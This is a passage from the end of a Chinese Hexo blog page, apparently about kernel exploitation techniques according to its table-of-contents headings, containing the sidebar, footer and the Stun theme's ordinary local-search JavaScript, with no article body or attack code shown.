          ptmx_fop→check_flags</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#KSMA"><span class="toc-number">3.2.</span> <span class="toc-text">
          KSMA</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">4.</span> <span class="toc-text">
          参考文章</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/uploads/littledog.jpg" alt="avatar"></div></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/blingblingxuanxuan" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">78</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">5</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">62</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>blingbling</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon" data-popover-pos="up" data-popover="访问人数"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon" data-popover-pos="up" data-popover="浏览总量"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>Just follow your heart, and keep smiling.</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', '请输入字符');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>